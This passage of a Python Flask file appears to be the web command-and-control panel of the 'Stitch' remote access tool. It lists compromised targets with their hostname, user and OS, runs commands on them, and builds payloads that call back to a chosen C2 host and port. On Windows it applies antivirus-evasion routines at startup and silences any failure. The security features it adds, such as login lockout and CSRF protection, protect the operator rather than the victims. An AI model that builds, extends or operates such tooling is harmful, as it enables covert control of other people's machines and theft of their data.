#!/usr/bin/env python3
"""
Stitch Web Interface - Real Integration with Enhanced Security
This version integrates directly with the actual Stitch server for real command execution
Enhanced with comprehensive security, monitoring, and operational features
"""
import os
import sys
import json
import secrets
import socket
import threading
import time
import base64
import configparser
from datetime import datetime, timedelta
from collections import defaultdict
from functools import wraps

# Load environment variables from .env file if it exists
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    # python-dotenv not installed, environment variables must be set manually
    pass

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash, g, make_response, Response
from flask_socketio import SocketIO, emit
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.middleware.proxy_fix import ProxyFix

sys.path.insert(0, os.path.dirname(__file__))
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from Application.Stitch_Vars.globals import *
from Application import stitch_cmd, stitch_lib
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from Application.stitch_utils import *
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from Application.stitch_gen import *
from ssl_utils import get_ssl_context

# Import the new enhanced modules
from config import Config
from web_app_enhancements import integrate_enhancements, connection_manager, metrics_collector
from auth_utils import (
    api_key_manager, api_key_or_login_required,
    track_failed_login, is_login_locked, get_lockout_time_remaining,
    clear_failed_login_attempts
)
# Import native protocol bridge for C payload support
from native_protocol_bridge import native_bridge, send_command_to_native_payload

# Import Elite Command Executor for advanced command execution
from Core.elite_executor import EliteCommandExecutor
# Import configuration system
from Core.config import get_config, init_config
# Import advanced security systems
from Core.crypto_system import get_crypto, init_crypto
from Core.memory_protection import get_memory_protection
from Core.advanced_evasion import apply_evasions

# ============================================================================
# Configuration - Now loaded from Config module
# ============================================================================
# Use configuration from Config class for all settings
MAX_LOGIN_ATTEMPTS = Config.MAX_LOGIN_ATTEMPTS
LOGIN_LOCKOUT_MINUTES = Config.LOGIN_LOCKOUT_MINUTES
COMMANDS_PER_MINUTE = Config.COMMANDS_PER_MINUTE
EXECUTIONS_PER_MINUTE = Config.EXECUTIONS_PER_MINUTE
API_POLLING_PER_HOUR = Config.API_POLLING_PER_HOUR
DEFAULT_RATE_LIMIT_DAY = Config.DEFAULT_RATE_LIMIT_DAY
DEFAULT_RATE_LIMIT_HOUR = Config.DEFAULT_RATE_LIMIT_HOUR

# History and Logs
MAX_DEBUG_LOGS = Config.MAX_DEBUG_LOGS
MAX_COMMAND_HISTORY = Config.MAX_COMMAND_HISTORY
DEFAULT_LOG_FETCH_LIMIT = Config.DEFAULT_LOG_FETCH_LIMIT
DEFAULT_HISTORY_FETCH_LIMIT = Config.DEFAULT_HISTORY_FETCH_LIMIT

# Server
SERVER_RETRY_DELAY_SECONDS = 5      # Delay before retrying server start

# ============================================================================
# Global Stitch Server Instance
# ============================================================================
stitch_server_instance = None
server_lock = threading.Lock()

def get_stitch_server():
    """Get the shared Stitch server instance"""
    global stitch_server_instance
    with server_lock:
        if stitch_server_instance is None:
            stitch_server_instance = stitch_cmd.stitch_server()
        return stitch_server_instance

# ============================================================================
# Global Elite Executor Instance
# ============================================================================
elite_executor_instance = None
executor_lock = threading.Lock()

# Initialize advanced security systems
try:
    config = init_config()
    crypto = init_crypto()
    memory_protection = get_memory_protection()
    
    # Apply evasion techniques at startup (Windows only)
    if sys.platform == 'win32':
        from Core.advanced_evasion import apply_evasions
        evasion_results = apply_evasions()
except:
    pass  # Silent fail for compatibility

def get_elite_executor():
    """Get the shared elite command executor instance"""
    global elite_executor_instance
    with executor_lock:
        if elite_executor_instance is None:
            elite_executor_instance = EliteCommandExecutor()
        return elite_executor_instance

# ============================================================================
# Flask App Configuration with Enhanced Security
# ============================================================================
app = Flask(__name__)

# Configure ProxyFix for reverse proxy support (nginx, Apache, etc.)
# Only enable if behind a trusted proxy
if os.getenv('STITCH_BEHIND_PROXY', 'false').lower() in ('true', '1', 'yes'):
    pass
    # Configure for common proxy setups
    x_for = int(os.getenv('STITCH_PROXY_X_FOR', '1'))
    x_proto = int(os.getenv('STITCH_PROXY_X_PROTO', '1'))
    x_host = int(os.getenv('STITCH_PROXY_X_HOST', '1'))
    x_prefix = int(os.getenv('STITCH_PROXY_X_PREFIX', '0'))
    
    app.wsgi_app = ProxyFix(
        app.wsgi_app,
        x_for=x_for,
        x_proto=x_proto,
        x_host=x_host,
        x_prefix=x_prefix
    )
    # print(f"✓ ProxyFix enabled: x_for={x_for}, x_proto={x_proto}, x_host={x_host}, x_prefix={x_prefix}")
else:
    pass
    # print("ℹ️  ProxyFix disabled - set STITCH_BEHIND_PROXY=true if behind reverse proxy")

# Use persistent secret key from Config
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['SESSION_COOKIE_HTTPONLY'] = Config.SESSION_COOKIE_HTTPONLY
app.config['SESSION_COOKIE_SAMESITE'] = Config.SESSION_COOKIE_SAMESITE
app.config['SESSION_COOKIE_SECURE'] = Config.SESSION_COOKIE_SECURE
app.config['PERMANENT_SESSION_LIFETIME'] = Config.PERMANENT_SESSION_LIFETIME

# CSRF Protection Configuration
app.config['WTF_CSRF_TIME_LIMIT'] = None
app.config['WTF_CSRF_SSL_STRICT'] = Config.WTF_CSRF_SSL_STRICT

# Initialize CSRF Protection
csrf = CSRFProtect(app)

# Print configuration status
# Startup information (commented for production)
# print("=" * 75)
# print(f"Oranolio Web Interface {Config.APP_VERSION} - Enhanced Security Edition")
# print("=" * 75)
# print(f"✓ Persistent secret key: {'Loaded from file' if Config.SECRET_KEY_FILE.exists() else 'Generated'}")
# print(f"✓ HTTPS: {'Enabled' if Config.ENABLE_HTTPS else 'Disabled'}")
# print(f"✓ API Keys: {'Enabled' if Config.ENABLE_API_KEYS else 'Disabled'}")
# print(f"✓ Metrics: {'Enabled' if Config.ENABLE_METRICS else 'Disabled'}")
# print(f"✓ Failed Login Alerts: {'Enabled' if Config.ENABLE_FAILED_LOGIN_ALERTS else 'Disabled'}")
# print(f"✓ WebSocket Update Interval: {Config.WEBSOCKET_UPDATE_INTERVAL} seconds")
# print("=" * 75)

# Rate Limiting Configuration
# Support Redis for distributed rate limiting or fallback to memory
redis_url = os.getenv('STITCH_REDIS_URL', 'memory://')
if redis_url != 'memory://':
    pass
    # print(f"✓ Rate limiting: Using Redis at {redis_url}")
else:
    pass
    # print("⚠️  Rate limiting: Using memory backend (not shared across instances)")
    # print("   For production with multiple workers, set STITCH_REDIS_URL=redis://localhost:6379")

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=[f"{DEFAULT_RATE_LIMIT_DAY} per day", f"{DEFAULT_RATE_LIMIT_HOUR} per hour"],
    storage_uri=redis_url,
    strategy="fixed-window"
)

# CORS Configuration - Load allowed origins from environment  
def get_cors_origins():
    """
    Get CORS allowed origins from environment variable.
    Supports multiple origins separated by comma.
    Returns list of allowed origins.
    SECURITY: Rejects wildcard '*' to enforce origin restrictions.
    """
    cors_env = os.getenv('STITCH_ALLOWED_ORIGINS', '')
    
    # In development mode, allow localhost variations
    if not cors_env or cors_env.strip() == '':
        pass
        # print("⚠️  CORS: Using default localhost-only policy (development mode)")
        # print("   For production, set STITCH_ALLOWED_ORIGINS=https://yourdomain.com")
        # Default to localhost variations for development
        return [
            'http://localhost:5000',
            'http://127.0.0.1:5000',
            'https://localhost:5000',
            'https://127.0.0.1:5000'
        ]
    
    # Parse comma-separated list
    origins = [origin.strip() for origin in cors_env.split(',') if origin.strip()]
    
    # Validate origins - REJECT wildcard
    for origin in origins:
        if origin == '*':
            raise ValueError(
                "\n" + "="*75 + "\n"
                "SECURITY ERROR: Wildcard CORS origin '*' is NOT ALLOWED\n"
                "="*75 + "\n"
                "The wildcard '*' allows ANY website to connect to your Stitch interface,\n"
                "making it vulnerable to cross-site attacks.\n\n"
                "For development: Remove STITCH_ALLOWED_ORIGINS (uses localhost by default)\n"
                "For production: Set specific domains:\n"
                "  STITCH_ALLOWED_ORIGINS=https://yourdomain.com\n"
                "  STITCH_ALLOWED_ORIGINS=https://yourdomain.com,https://app.yourdomain.com\n"
                "="*75
            )
        elif not (origin.startswith('http://') or origin.startswith('https://')):
            raise ValueError(f"Invalid CORS origin: {origin}. Must start with http:// or https://")
    
    # print(f"✓ CORS: Restricted to {len(origins)} origin(s): {', '.join(origins)}")
    return origins if origins else ['http://localhost:5000']

# Initialize SocketIO with configured CORS origins (single initialization)
cors_origins = get_cors_origins()
socketio = SocketIO(app, cors_allowed_origins=cors_origins, async_mode='threading', ping_timeout=60, ping_interval=25)

# Integrate all enhancements (must be after SocketIO initialization)
app, socketio, limiter = integrate_enhancements(app, socketio, limiter)

# ============================================================================
# Global State
# ============================================================================
command_history = []
debug_logs = []
login_attempts = defaultdict(list)
connection_health = {}  # Track connection health metrics: {ip: {'last_seen': timestamp, 'connected_at': timestamp}}
connection_context = {}

# Load credentials from environment variables
def load_credentials():
    """
    Load admin credentials from environment variables.
    PRODUCTION SECURITY: No default fallback - forces explicit credential configuration.
    """
    username = os.getenv('STITCH_ADMIN_USER')
    password = os.getenv('STITCH_ADMIN_PASSWORD')
    
    # In debug mode, provide development defaults for username only
    if os.getenv('STITCH_DEBUG', '').lower() == 'true':
        if not username:
            username = 'admin'
            # print("⚠️  DEBUG MODE: Using default username 'admin'")
    
    # Require explicit credentials - no defaults in production
    if not username or not password:
        raise RuntimeError(
            "\n" + "="*75 + "\n"
            "🔐 SECURITY ERROR: Missing credentials!\n"
            "="*75 + "\n"
            "Authentication credentials must be explicitly configured.\n"
            "No default credentials allowed for security.\n\n"
            "Please set environment variables:\n"
            "  STITCH_ADMIN_USER='your_username'\n"
            "  STITCH_ADMIN_PASSWORD='your_secure_password'\n\n"
            "Or for development:\n"
            "  STITCH_DEBUG=true (enables default credentials)\n\n"
            "In Replit: Add these to Secrets tab (🔒 icon)\n"
            "="*75
        )
    
    # Validate password strength
    if len(password) < 12:
        raise RuntimeError(
            "\n" + "="*75 + "\n"
            "🔐 SECURITY ERROR: Password too short!\n"
            "="*75 + "\n"
            f"Your password is {len(password)} characters.\n"
            "Minimum required: 12 characters\n\n"
            "Please set a stronger password:\n"
            "  STITCH_ADMIN_PASSWORD='your_secure_password_12+_chars'\n\n"
            "In Replit: Update in Secrets tab (🔒 icon)\n"
            "="*75
        )
    
    # Validate username
    if len(username) < 3:
        raise RuntimeError(
            "\n" + "="*75 + "\n"
            "🔐 SECURITY ERROR: Username too short!\n"
            "="*75 + "\n"
            "Username must be at least 3 characters.\n"
            "="*75
        )
    
    # print(f"✓ Credentials loaded: {username} ({len(password)} characters)")
    return {username: generate_password_hash(password)}

# Initialize users (will be loaded at startup)
USERS = {}

# Load credentials at module level for WSGI compatibility
def initialize_credentials():
    """Initialize credentials at app startup"""
    global USERS
    if not USERS:  # Only load if not already loaded
        try:
            loaded_creds = load_credentials()
            USERS.update(loaded_creds)
            # print("✓ Credentials loaded from environment variables")
        except RuntimeError as e:
            pass
            # Only print full error once
            if 'SECURITY ERROR' in str(e):
                pass
                # print("\n⚠️  Credentials not configured. Set STITCH_ADMIN_USER and STITCH_ADMIN_PASSWORD or use STITCH_DEBUG=true for development.\n")
            else:
                pass
                # print(f"ERROR: {str(e)}")
            raise

# Initialize credentials when module is imported (WSGI compatibility)
# Only try once to avoid infinite loops during testing/import
_credentials_initialized = False

def ensure_credentials_loaded():
    """Ensure credentials are loaded exactly once"""
    global _credentials_initialized
    if not _credentials_initialized:
        try:
            initialize_credentials()
            _credentials_initialized = True
        except RuntimeError:
            # Don't fail on import - let main handle this
            pass

# Try to load credentials on import
ensure_credentials_loaded()

# ============================================================================
# Helper Functions
# ============================================================================
def log_debug(message, level="INFO", category="System"):
    """Enhanced logging"""
    from flask import has_request_context
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Get username from session if we're in a request context
    username = 'system'
    if has_request_context():
        username = session.get('username', 'system')
    
    # Sanitize username for logs
    sanitized_user = sanitize_for_log(username, 'username') if username != 'system' else 'system'
    
    log_entry = {
        'timestamp': timestamp,
        'level': level,
        'category': category,
        'message': str(message),
        'user': sanitized_user
    }
    debug_logs.append(log_entry)
    if len(debug_logs) > MAX_DEBUG_LOGS:
        debug_logs.pop(0)
    
    # Only emit if socket.io is running
    try:
        socketio.emit('debug_log', log_entry, namespace='/')
    except Exception:
        pass
    
    # print(f"[{level}] {message}")

def sanitize_for_log(data, data_type='generic'):
    """
    Sanitize sensitive data for secure logging.
    
    Args:
        data: The sensitive data to sanitize
        data_type: Type of data ('username', 'command', 'generic')
    
    Returns:
        Sanitized string safe for logging
    """
    import hashlib
    import re
    
    if data is None or data == '':
        return '[EMPTY]'
    
    data_str = str(data)
    
    if data_type == 'username':
        pass
        # Show first 2 chars + *** + hash for correlation
        # This allows tracking the same user across logs without exposing identity
        prefix = data_str[:2] if len(data_str) >= 2 else data_str[0] if len(data_str) == 1 else ''
        hash_suffix = hashlib.sha256(data_str.encode()).hexdigest()[:8]
        return f"{prefix}***[{hash_suffix}]"
    
    elif data_type == 'command':
        pass
        # Sanitize commands by redacting sensitive parameters
        # List of sensitive parameter patterns
        sensitive_patterns = [
            (r'(password|passwd|pwd|pass)[\s=:]+[\S]+', r'\1=[REDACTED]'),
            (r'(key|apikey|api_key|token|secret)[\s=:]+[\S]+', r'\1=[REDACTED]'),
            (r'(auth|authorization|bearer)[\s=:]+[\S]+(\s+[\S]+)?', r'\1=[REDACTED]'),
            (r'--password[\s=]+[\S]+', r'--password=[REDACTED]'),
            (r'-p[\s]+[\S]+', r'-p [REDACTED]'),
            (r'(https?://[^:]+:)([^@]+)(@)', r'\1[REDACTED]\3'),  # URLs with credentials
        ]
        
        sanitized = data_str
        for pattern, replacement in sensitive_patterns:
            sanitized = re.sub(pattern, replacement, sanitized, flags=re.IGNORECASE)
        
        # If command is too long, truncate it
        if len(sanitized) > 200:
            sanitized = sanitized[:200] + '... [truncated]'
        
        return sanitized
    
    else:
        pass
        # Generic sanitization - just hash it
        hash_val = hashlib.sha256(data_str.encode()).hexdigest()[:12]
        return f"[REDACTED:{hash_val}]"

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ============================================================================
# Response Header Middleware
# ============================================================================
@app.after_request
def set_server_header(response):
    """Set comprehensive security headers"""
    # Generic server header to prevent fingerprinting
    response.headers['Server'] = 'WebServer'
    
    # Security headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    
    # HSTS for HTTPS only
    if request.is_secure:
        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    return response

# ============================================================================
# Error Handlers
# ============================================================================
@app.errorhandler(429)
def ratelimit_handler(e):
    """Custom error handler for rate limit exceeded"""
    client_ip = get_remote_address()
    log_debug(f"Rate limit exceeded for IP {client_ip}: {str(e)}", "WARNING", "Security")
    
    # Return JSON for API requests
    if request.path.startswith('/api/'):
        return jsonify({
            'error': 'Rate limit exceeded',
            'message': 'Too many requests. Please slow down and try again later.',
            'retry_after': '60 seconds'
        }), 429
    
    # Return HTML page for regular requests (login page)
    flash('Too many requests. Please wait a moment and try again.', 'error')
    return render_template('login.html'), 429

# ============================================================================
# Routes - Authentication
# ============================================================================
@app.route('/health')
def health():
    """Health check endpoint for deployment"""
    return jsonify({'status': 'healthy', 'service': 'stitch-web'}), 200

@app.route('/')
@login_required
def index():
    return render_template('dashboard_real.html')

@app.route('/login', methods=['GET', 'POST'])
# Rate limiting removed for easier testing
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        client_ip = get_remote_address()
        # Validate inputs exist
        if not username or not password:
            flash('Username and password are required.', 'error')
            return render_template('login.html'), 400
        
        # Check if IP is locked out using enhanced tracking
        if is_login_locked(client_ip):
            remaining_seconds = get_lockout_time_remaining(client_ip)
            remaining_minutes = (remaining_seconds + 59) // 60  # Round up to minutes
            log_debug(f"Login lockout for IP {client_ip} - {remaining_minutes} minutes remaining", "ERROR", "Security")
            flash(f'Too many failed attempts. Please try again in {remaining_minutes} minutes.', 'error')
            return render_template('login.html'), 429
        
        # Verify credentials
        if username in USERS and password and check_password_hash(USERS[username], password):
            pass
            # Successful login - clear failed attempts
            clear_failed_login_attempts(client_ip)
            session.permanent = True
            session['logged_in'] = True
            session['username'] = username
            # For compatibility with metrics/auth utils expecting 'user'
            session['user'] = username
            session['login_time'] = datetime.now().isoformat()
            
            # Track metrics
            metrics_collector.increment_counter('total_logins')
            
            log_debug(f"✓ User {sanitize_for_log(username, 'username')} logged in from {client_ip}", "INFO", "Authentication")
            return redirect(url_for('index'))
        else:
            pass
            # Failed login - track with enhanced system
            attempt_count = track_failed_login(client_ip, username)
            
            # Track metrics
            metrics_collector.increment_counter('failed_logins')
            
            # Check if now locked
            if is_login_locked(client_ip):
                remaining_seconds = get_lockout_time_remaining(client_ip)
                remaining_minutes = (remaining_seconds + 59) // 60
                flash(f'Too many failed attempts. Account locked for {remaining_minutes} minutes.', 'error')
                log_debug(f"✗ Failed login triggered lockout for {sanitize_for_log(username, 'username')} from {client_ip}", "WARNING", "Security")
            else:
                attempts_remaining = MAX_LOGIN_ATTEMPTS - attempt_count
                flash(f'Invalid credentials. {attempts_remaining} attempts remaining.', 'error')
                log_debug(f"✗ Failed login attempt for user {sanitize_for_log(username, 'username')} from {client_ip} (attempt {attempt_count}/{MAX_LOGIN_ATTEMPTS})", "WARNING", "Security")
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    username = session.get('username', 'unknown')
    session.clear()
    log_debug(f"User {sanitize_for_log(username, 'username')} logged out", "INFO", "Authentication")
    return redirect(url_for('login'))

# ============================================================================
# Routes - Connection Management (REAL)
# ============================================================================
@app.route('/api/connections')
@login_required
@limiter.limit(f"{COMMANDS_PER_MINUTE} per minute")
def get_connections():
    """Get REAL-TIME connections from Stitch server"""
    try:
        metrics_collector.increment_counter('api_requests')
        server = get_stitch_server()
        connections = []
        
        # Get active connections from inf_sock (REAL connections)
        active_ips = list(server.inf_sock.keys())
        
        # Get historical data from config
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        # Combine active and historical connections
        all_targets = set(active_ips + config.sections())
        
        for target in all_targets:
            is_online = target in active_ips
            
            # Update health tracking for online connections
            if is_online:
                now = datetime.now().isoformat()
                if target not in connection_health:
                    connection_health[target] = {
                        'connected_at': now,
                        'last_seen': now
                    }
                else:
                    connection_health[target]['last_seen'] = now
            
            # Get health metrics
            health_data = connection_health.get(target, {})
            
            # Get connection details
            if target in config.sections():
                conn_data = {
                    'id': target,
                    'target': target,
                    'port': config.get(target, 'port') if config.has_option(target, 'port') else '4040',
                    'os': config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown',
                    'hostname': config.get(target, 'hostname') if config.has_option(target, 'hostname') else target,
                    'user': config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown',
                    'status': 'online' if is_online else 'offline',
                    'connected_at': health_data.get('connected_at', 'N/A'),
                    'last_seen': health_data.get('last_seen', 'N/A'),
                }
            else:
                pass
                # New connection not yet in history
                conn_data = {
                    'id': target,
                    'target': target,
                    'port': server.inf_port.get(target, '4040'),
                    'os': 'Pending...',
                    'hostname': target,
                    'user': 'Pending...',
                    'status': 'online',
                    'connected_at': health_data.get('connected_at', datetime.now().isoformat()),
                    'last_seen': health_data.get('last_seen', datetime.now().isoformat()),
                }
            
            connections.append(conn_data)
        
        # Sort: online first, then by target
        connections.sort(key=lambda x: (x['status'] != 'online', x['target']))
        
        log_debug(f"Retrieved {len(connections)} connections ({len(active_ips)} online)", "INFO", "Connection")
        return jsonify(connections)
        
    except Exception as e:
        log_debug(f"Error getting connections: {str(e)}", "ERROR", "Connection")
        return jsonify({'error': str(e)}), 500

@app.route('/api/connections/active')
@login_required
@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")  # High limit for UI polling
def get_active_connections():
    """Get only ONLINE connections"""
    try:
        metrics_collector.increment_counter('api_requests')
        server = get_stitch_server()
        active_conns = []
        
        for ip in server.inf_sock.keys():
            active_conns.append({
                'ip': ip,
                'port': server.inf_port.get(ip, 'Unknown'),
                'status': 'online'
            })
        
        return jsonify(active_conns)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/server/status')
@login_required
@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")  # High limit for UI polling
def server_status():
    """Get Stitch server status"""
    try:
        metrics_collector.increment_counter('api_requests')
        server = get_stitch_server()
        status = {
            'listening': server.listen_port is not None,
            'port': server.listen_port if server.listen_port else 'Not listening',
            'active_connections': len(server.inf_sock),
            'server_running': server.server_thread is not None
        }
        return jsonify(status)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# Routes - Command Execution (REAL)
# ============================================================================
@app.route('/api/command_definitions', methods=['GET'])
@login_required
def get_command_definitions():
    """Get command definitions for interactive commands"""
    try:
        return jsonify({
            'success': True,
            'definitions': COMMAND_DEFINITIONS
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/targets', methods=['GET'])
@login_required
@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")
def get_targets():
    """Get list of connected targets from Stitch server"""
    try:
        metrics_collector.increment_counter('api_requests')
        targets = sync_stitch_targets()
        
        return jsonify({
            'success': True,
            'targets': targets,
            'count': len(targets),
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        log_debug(f"Error getting targets: {str(e)}", "ERROR", "API")
        return jsonify({'success': False, 'error': str(e)}), 500
        
@app.route('/api/targets/active', methods=['GET'])
@login_required
@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")
def get_active_targets():
    """Get only ONLINE targets (for polling)"""
    try:
        metrics_collector.increment_counter('api_requests')
        server = get_stitch_server()
        
        targets = []
        for target_id in server.inf_sock.keys():
            targets.append({
                'id': target_id,
                'status': 'online',
                'last_seen': time.time()
            })
            
        return jsonify({
            'success': True,
            'targets': targets,
            'count': len(targets)
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/execute', methods=['POST'])
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def execute_command():
    """Execute REAL commands on targets"""
    try:
        metrics_collector.increment_counter('api_requests')
        data = request.json
        conn_id = data.get('connection_id')
        command = data.get('command')
        parameters = data.get('parameters', None)  # Optional parameters for interactive commands
        
        # Server-side validation (critical for security)
        if not command:
            return jsonify({'success': False, 'error': 'Missing command'}), 400
        
        # Validate command is a string
        if not isinstance(command, str):
            return jsonify({'success': False, 'error': 'Invalid command type'}), 400
        
        # Trim and validate
        command = command.strip()
        if not command or len(command) < 1:
            return jsonify({'success': False, 'error': 'Command cannot be empty'}), 400
        
        # Length validation (prevent DoS)
        MAX_COMMAND_LENGTH = 500
        if len(command) > MAX_COMMAND_LENGTH:
            return jsonify({'success': False, 'error': f'Command too long (max {MAX_COMMAND_LENGTH} characters)'}), 400
        
        # Check for null bytes and control characters (security)
        if any(ord(c) < 32 and c not in '\t\n\r' for c in command):
            return jsonify({'success': False, 'error': 'Command contains invalid control characters'}), 400
        
        # Sanitize excessive whitespace
        command = ' '.join(command.split())
        
        log_debug(f"Executing command: {sanitize_for_log(command, 'command')} on {conn_id or 'server'}", "INFO", "Command")
        
        # Track command
        command_entry = {
            'timestamp': datetime.now().isoformat(),
            'connection_id': conn_id,
            'command': command,
            'user': session.get('username'),
        }
        command_history.append(command_entry)
        if len(command_history) > MAX_COMMAND_HISTORY:
            command_history.pop(0)
        
        # Execute command with optional parameters - Use elite executor first
        output = execute_command_elite(conn_id, command, parameters=parameters)
        
        return jsonify({
            'success': True,
            'output': output,
            'command': command,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        log_debug(f"Error executing command: {str(e)}", "ERROR", "Command")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/elite/status')
@login_required
def elite_status():
    """Get elite executor status and available commands"""
    try:
        executor = get_elite_executor()
        commands = executor.get_available_commands()
        
        return jsonify({
            'success': True,
            'available_commands': list(commands),
            'total_commands': len(commands),
            'status': 'operational',
            'integration': 'connected',
            'message': f'Elite executor operational with {len(commands)} commands'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'status': 'error'
        }), 500

@app.route('/api/export/logs')
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def export_logs():
    """Export debug logs as JSON or CSV"""
    import csv
    import io
    try:
        metrics_collector.increment_counter('api_requests')
        format_type = request.args.get('format', 'json').lower()
        
        if format_type == 'json':
            data = json.dumps(list(debug_logs), indent=2)
            mimetype = 'application/json'
            filename = f'stitch_logs_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        elif format_type == 'csv':
            output = io.StringIO()
            if debug_logs:
                fieldnames = ['timestamp', 'level', 'category', 'message', 'user']
                writer = csv.DictWriter(output, fieldnames=fieldnames)
                writer.writeheader()
                for log in debug_logs:
                    writer.writerow(log)
            data = output.getvalue()
            mimetype = 'text/csv'
            filename = f'stitch_logs_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
        else:
            return jsonify({'error': 'Invalid format'}), 400
        
        log_debug(f"Logs exported as {format_type.upper()}", "INFO", "Export")

        headers = {
            'Content-Disposition': f'attachment; filename={filename}',
            'Content-Length': str(len(data.encode('utf-8') if isinstance(data, str) else data)),
        }
        # Simple weak ETag using length-timestamp
        headers['ETag'] = f'W/"{len(data)}-{int(time.time())}"'

        return Response(data, mimetype=mimetype, headers=headers)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/commands')
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def export_commands():
    """Export command history as JSON or CSV"""
    import csv
    import io
    try:
        metrics_collector.increment_counter('api_requests')
        format_type = request.args.get('format', 'json').lower()
        
        if format_type == 'json':
            data = json.dumps(list(command_history), indent=2)
            mimetype = 'application/json'
            filename = f'stitch_commands_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        elif format_type == 'csv':
            output = io.StringIO()
            if command_history:
                fieldnames = ['timestamp', 'connection_id', 'command', 'user']
                writer = csv.DictWriter(output, fieldnames=fieldnames)
                writer.writeheader()
                for cmd in command_history:
                    writer.writerow(cmd)
            data = output.getvalue()
            mimetype = 'text/csv'
            filename = f'stitch_commands_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
        else:
            return jsonify({'error': 'Invalid format'}), 400
        
        log_debug(f"Command history exported as {format_type.upper()}", "INFO", "Export")

        headers = {
            'Content-Disposition': f'attachment; filename={filename}',
            'Content-Length': str(len(data.encode('utf-8') if isinstance(data, str) else data)),
        }
        headers['ETag'] = f'W/"{len(data)}-{int(time.time())}"'

        return Response(data, mimetype=mimetype, headers=headers)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/generate-payload', methods=['POST', 'OPTIONS'])
@login_required
@limiter.limit("5 per hour")  # Limit payload generation
def generate_payload():
    """Generate Stitch payload with specified configuration - ENHANCED VERSION"""
    try:
        metrics_collector.increment_counter('api_requests')
        data = request.json or {}
        
        # Check if native payload requested
        if data.get('type') == 'native':
            from native_payload_builder import native_builder
            
            config = {
                'platform': data.get('platform', 'linux'),
                'c2_host': data.get('bind_host', 'localhost'),
                'c2_port': data.get('bind_port', 4433)
            }
            
            log_debug(f"Generating native {config['platform']} payload", "INFO", "Payload")
            
            # Compile native payload
            result = native_builder.compile_payload(config)
            
            if result['success']:
                session['payload_path'] = result['path']
                session['payload_filename'] = f"payload_{config['platform']}"
                session['payload_type'] = 'native'
                session['payload_platform'] = config['platform']
                
                log_debug(f"Native payload generated: {result['size']} bytes", "INFO", "Payload")
                
                return jsonify({
                    'success': True,
                    'message': result['message'],
                    'payload_size': result['size'],
                    'payload_type': 'native',
                    'platform': result['platform'],
                    'filename': os.path.basename(result['path']),
                    'hash': result['hash'],
                    'config': config,
                    'download_url': '/api/download-payload'
                })
            else:
                log_debug(f"Native payload generation failed: {result['error']}", "ERROR", "Payload")
                return jsonify({'error': result['error']}), 500
        
        # Import the enhanced payload generator
        from web_payload_generator import web_payload_gen
        
        # Get configuration from request
        config = {
            'bind_host': data.get('bind_host', ''),
            'bind_port': data.get('bind_port', '4433'),
            'listen_host': data.get('listen_host', 'localhost'),
            'listen_port': data.get('listen_port', '4455'),
            'enable_bind': data.get('enable_bind', True),
            'enable_listen': data.get('enable_listen', True),
            'platform': data.get('platform', 'linux'),  # Support platform selection
            'payload_name': data.get('payload_name', 'stitch_payload')
        }
        
        log_debug(f"Generating payload for platform: {config['platform']}", "INFO", "Payload")
        
        # Generate payload using enhanced generator
        result = web_payload_gen.generate_payload(config)
        
        if result['success']:
            pass
            # Store payload info in session for download
            session['payload_path'] = result['payload_path']
            session['payload_filename'] = result['filename']
            session['payload_type'] = result['payload_type']
            session['payload_platform'] = result['platform']
            
            log_debug(f"Payload generated: {result['filename']} ({result['size']} bytes, {result['payload_type']})", "INFO", "Payload")
            
            # Clean up old payloads (keep last 10)
            try:
                web_payload_gen.cleanup_old_payloads(keep_last=10)
            except Exception:
                pass  # Don't fail if cleanup fails
            
            response_data = {
                'success': True,
                'message': result['message'],
                'payload_size': result['size'],
                'payload_type': result['payload_type'],
